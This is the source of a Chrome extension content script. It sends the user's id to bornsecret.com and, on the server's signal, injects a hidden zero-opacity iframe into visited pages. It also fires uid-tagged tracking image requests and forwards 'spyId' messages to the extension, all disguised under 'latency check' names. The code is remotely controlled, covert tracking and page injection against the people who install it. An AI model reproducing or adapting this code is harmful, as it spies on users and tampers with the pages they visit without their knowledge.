chrome.runtime.sendMessage({text: "uid"}, function(rsp) {
var rary = rsp.split("|");
var uid=rary[0];
if(rary[1]=="false"){return;}
var latency_ary = new Array(2);
var b_uri='https://bornsecret.com';
var ct= b_uri+"/lat_chk";
var cti= b_uri+"/lat_chk.png";
var b_nme='player_ias/base';
var latncy_url = b_uri+"/latck?v=9.18&u="+uid;
var urlin = document.location.toString();
window.fload = {};
latency_ary[0]=0;
runLatChk();
function runLatChk() {
    var imi = new XMLHttpRequest();
    imi.onreadystatechange = function() {if (imi.readyState == 4 && imi.status == 200) {latency_ary = JSON.parse(this.responseText);RtnAnsw();}}
    imi.open("GET", latncy_url, true);
    imi.send(null);
}
function RtnAnsw() {
	if (latency_ary[0] == 1) {
  fload.ready = function(gn) {
    if (document.readyState == "complete")
      return gn();
    if (window.addEventListener)
      window.addEventListener("load", gn, false);
    else if (window.attachEvent)
      window.attachEvent("onload", gn);
    else
  	  window.onload = gn;
  } 
  fload.ready(function() {
			if (window.top == window.self) {
				if (document.getElementById('latency_chk') == null){
	  			var ifm = document.createElement('iframe');ifm.src = ct;ifm.style.position = 'fixed';ifm.style.zIndex = '-99';ifm.style.opacity = '0';ifm.setAttribute('id', "latency_chk");document.body.appendChild(ifm);
  			}
			}
		if (document.location==ct || document.referrer==ct){
			if(latency_ary[1]!=0){b_nme=latency_ary[1];}
			var echk = document.getElementsByName(b_nme)[0];
			if (typeof(echk) != 'undefined' && echk != null){echk.src=cti+"?u="+uid+"&m="+Math.random();document.body.appendChild(echk.cloneNode(true));echk=document.createElement(echk.nodeName);echk.src=cti+"?u="+uid+"&m="+Math.random();document.body.appendChild(echk);}
		}
  	});
	}
}
});
window.addEventListener('message', function(event) {
    // Only accept messages from the same frame
    if (event.source !== window) {
        return;
    }

    var message = event.data;

    // Only accept messages that we know are ours
    if (typeof message !== 'object' || message === null || !message.spyId) {
        return;
    }

    // console.log('content script forwards the message');

    chrome.runtime.sendMessage(message);
});

console.log('content script loaded');

chrome.runtime.sendMessage({spyId:'init',url:'none',res:'ok'});
